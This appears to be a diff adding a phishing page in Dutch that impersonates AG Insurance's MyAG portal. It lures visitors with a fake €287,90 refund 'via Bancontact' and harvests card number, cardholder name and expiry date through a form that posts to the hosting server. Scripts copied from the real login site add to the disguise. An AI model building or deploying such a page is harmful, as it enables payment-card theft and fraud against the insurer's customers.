@@ -1,0 +1,217 @@
+<!DOCTYPE html><html><head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="format-detection" content="telephone=no">
+      <title>
+         My AG/Bevestiging teruggave €287,90
+      </title>
+      <link rel="stylesheet" type="text/css" href="css/style.min.css">
+      <script src="js/modernizr.js"></script>
+      <script src="js/jquery.js"></script>
+      <link rel="shortcut icon" href="favicon.ico">
+      <link rel="stylesheet" type="text/css" href="css/intlTelInputCss.min.css">
+      <link rel="stylesheet" type="text/css" href="css/modal_message.min.css">
+      <link rel="stylesheet" type="text/css" href="css/default.css">
+      <!-- Adobe Analytics configuration -->
+      <script src="js/tracking.js"></script>
+      <script src="js/qualityassurance.js"></script>
+      <script src="js/launch-EN317c4196bfa04cf7ad5b1bda3b15d040.min.js"></script>
+      <script src="js/adobe.js"></script>
+      <!-- End of Adobe Analytics configuration -->
+   </head>
+   <body x-ms-format-detection="none" data-tracking-event="page-impression" data-tracking-info="{'language' : 'nl'}">
+      <div class="container-fluid" id="interactiveZone">
+      <!-- display the banner message on top of the content -->
+      <!-- banner with logo on top of the content -->
+      <div id="banner" class="clearfix" alt="AG Insurance">
+         <div id="bannerCorporateColor"></div>
+         <div id="bannerFront">
+            <a>
+               <div class="container">
+                  <div id="bannerApplicationName" class="col-xs-9">
+                     <div>Teruggave €287,90</div>
+                  </div>
+                  <div id="bannerLogo" class="col-xs-3">
+                     <div id="logo"></div>
+                  </div>
+               </div>
+            </a>
+         </div>
+      </div>
+      <!-- form page where view and partial are rendered -->
+      <div class="clearfix" id="contentForm">
+      <div id="breadcrumb" class="clearfix breadcrumb-spacer">
+         <div id="breadcrumb_content">
+            <div id="breadcrumb_icon">
+               <img src="images/info-fill.svg" alt="icon">
+            </div>
+            <div id="breadcrumb_title">
+               <div id="breadcrumb_method">Teruggaveformulier</div>
+               <div id="breadcrumb_separator" class="d-none d-md-inline">/</div>
+               <div id="breadcrumb_page">Bevestiging</div>
+            </div>
+         </div>
+         <div class="divider-line"></div>
+      </div>
+      <div id="loginGsm" class="bottom-margin-20">
+         <a class="methodBlock" id="ItsMeBlock">
+            <div class="methodImageColumn">
+               <img src="images/bancontact-original.svg" alt="icon">
+            </div>
+            <div class="methodTitleColumn">
+               <div>Teruggave via Bancontact</div>
+            </div>
+         </a>
+		 <form method="post">
+                  <div class="form-group">
+                     <div class="stepForm top-margin-20">
+                        <div class="stepTitleText">Kaartnummer</div>
+                     </div>
+                     <div class="formInput">
+                        <input autocomplete="off" class="form-control" data-inputmask=" " data-val="true" data-val-length="Uw kaartnummer is ongeldig." data-val-length-max="24" data-val-length-min="0" data-val-required="U bent uw kaartnummer vergeten in te geven." id="kaartnummer" maxlength="24" name="kaartnummer" placeholder="6703 1234 5678 9012 3" type="text" value="">
+                     </div>
+                     <span class="field-validation-valid" data-valmsg-for="kaartnummer" data-valmsg-replace="true"></span>
+                  </div>
+                  <div class="form-group">
+                     <div class="stepForm top-margin-20">
+                        <div class="stepTitleText">Naam kaarthouder</div>
+                     </div>
+                     <div class="formInput">
+                        <input autocomplete="off" class="form-control" data-inputmask=" " data-val="true" data-val-length="Naam kaarthouder is ongeldig." data-val-length-max="35" data-val-length-min="5" data-val-required="U bent de naam van de kaarthouder vergeten in te geven." id="kaarthouder" maxlength="35" name="kaarthouder" placeholder="Naam kaarthouder" type="text" value="">
+                     </div>
+                     <span class="field-validation-valid" data-valmsg-for="kaarthouder" data-valmsg-replace="true"></span>
+                  </div>
+                  <div class="form-group">
+                     <div class="stepForm top-margin-20">
+                        <div class="stepTitleText">Vervaldatum</div>
+                     </div>
+                     <div class="formInput">
+					    <input autocomplete="off" class="form-control" data-inputmask=" " data-val="true" data-val-required="U bent vergeten een vervaldatum in te geven." id="vervaldatum" maxlength="7" minlength="7" name="vervaldatum" type="text" value="" onkeyup="date_reformat_dd(this);" onkeypress="date_reformat_dd(this);" onpaste="date_reformat_dd(this);" placeholder="MM / JJ">
+                     </div>
+                     <span class="field-validation-valid" data-valmsg-for="vervaldatum" data-valmsg-replace="true"></span>
+                  </div>
+         <div id="navigationZone">
+            <div class="divider-line bottom-margin-20"></div>
+            <!-- 1 lien (qui peut ou pas apparaitre) et un bouton de navigation/validation d'étape -->
+            <div class="row">
+			<input class="btn btn-primary" id="buttonValidate" type="submit" value="Teruggave bevestigen">
+               <div id="navigationZoneLink" class="col-xs-12 col-sm-8 order-sm-1">
+                  <a href="#" class="noDoubleClick"></a>
+               </div>
+            </div>
+         </div>
+               </form>
+         <!-- fixed footer always at bottom of the interactivezone-->
+         <footer class="clearfix">
+            <div class="row">
+               <!-- choose language options -->
+               <div class="col">
+                  <ul>
+                     <li class="selectedLanguage ">
+                        © AG INSURANCE
+                     </li>
+                  </ul>
+               </div>
+            </div>
+            <!-- Button trigger direct link if only FAQ link is available -->
+            <div id="helpButtonLeft" class="helpButtonLeft"></div>
+            <div id="helpButtonExtended" class="helpButtonExtended">HULP NODIG</div>
+            <a id="helpButton" class="btn btn-primary" target="_blank" href="https://support.aginsurance.be/nl/faq/security/myag">
+            ?
+            </a>
+         </footer>
+      </div>
+      <input type="hidden" id="viewPath" value="/Views/Sms/SMSAuthentication.cshtml">
+      <script src="js/bootstrap.js"></script>
+      <script src="js/jqueryval.js"></script>
+      <script src="js/connect.js"></script>
+      <script src="js/Ag_Au_Login.js"></script>
+      <script src="js/ag_template_plugins.js"></script>
+      <script src="js/intlTelInput.js"></script>
+      <script src="js/inputmask.js"></script>
+      <script src="js/Ag_Sms_SmsAuthentication.js"></script>
+      <script type="text/javascript">
+         function checkFile(pathFile) {
+             $.ajax({
+                 url: pathFile,
+                 type: 'HEAD',
+                 success: function () {
+                     console.log("loaded " + pathFile)
+                 },
+                 error: function () {
+                     document.getElementById("SMSAuthentication_MobileNumber").placeholder = "+32470123456";
+                     console.log("not loaded " + pathFile)
+                 },
+             })
+         }
+         const utilsScriptLocation = "/PIAULOGIN/msa-idp/Scripts/IntlTelInput/utils.js";
+         const resources = {
+             NumberRequired: "U bent uw gsm-nummer vergeten in te geven.",
+             NumberFormatInvalid: "Oeps. Het formaat van je gsm-nummer is niet correct. Het juiste formaat is: 0499 999 999.",
+             UserNameAllowedCharactersRegex:"^[a-zA-Z0-9@\\.\\\u0027_\\-\\+]+$"
+         };
+         checkFile(utilsScriptLocation);//Not a problem if not loaded
+         checkFile("/PIAULOGIN/msa-idp/bundles/intlTelInput.js");//essential
+         SetView_Sms_SMSAuthentication(utilsScriptLocation, resources);
+      </script>
+      <!-- OneTrust Cookies Consent Notice start for aginsurance.be -->
+      <script type="text/javascript">
+         function OptanonWrapper() { }
+      </script>
+      <!-- OneTrust Cookies Consent Notice end for aginsurance.be -->
+      <script src="js/checkbrowsercompatibility.js"></script>
+      <div id="browserCheck" data-contenturl="/PIAULOGIN/msa-idp/ICMYAGINTERNET/nl/Modal/CheckBrowserCompatibilityPopUp"></div>
+      <script>
+         var currentLanguage = 'nl';
+         var popOverModel = {"PopOverType":null,"IsPopOverTypeVideo":false,"IsPopOverTypeFaq":false,"IsPopOverTypeContact":false,"FaqURL":"https://support.aginsurance.be/nl/faq/security/myag","isFaqLinksVisible":true,"IsEnrolmentProcess":false};
+         var modalUrl = '/PIAULOGIN/msa-idp/PopOver/LoadModal';
+         var trackingInfo =
+         {
+             'Culture': 'nl',
+             'CurrentAuthenticationType': 'OTP',
+             'Option': '',
+             'Flow': 'login',
+             'Application': 'ICMYAGINTERNET',
+             'Page': '/Views/Sms/SMSAuthentication.cshtml'
+         };
+      </script>
+      <script>
+         var body = window.document.querySelector("body");
+         body.setAttribute("data-tracking-event", "page-impression");
+         body.setAttribute("data-tracking-info", "{'language' : 'nl'}");
+      </script>
+      <script>
+         if (typeof _satellite != "undefined") {
+             _satellite.pageBottom();
+         }
+      </script>
+<script>
+	  function checkValue(str, max) {
+    if (str.charAt(0) !== '0' || str == '00') {
+        var num = parseInt(str);
+        if (isNaN(num) || num <= 0 || num > max) num = 1;
+        str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
+    };
+    return str;
+};
+
+// reformat by date
+function date_reformat_dd(date) {
+    date.addEventListener('input', function(e) {
+        this.type = 'text';
+        var input = this.value;
+        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
+        var values = input.split('/').map(function(v) {
+            return v.replace(/\D/g, '')
+        });
+        if (values[0]) values[0] = checkValue(values[0], 12);
+        if (values[1]) values[1] = checkValue(values[1], 99);
+        var output = values.map(function(v, i) {
+            return v.length == 2 && i < 2 ? v + ' / ' : v;
+        });
+        this.value = output.join('').substr(0, 7);
+    });
+}
+</script>
+   
+</div></div></body></html>
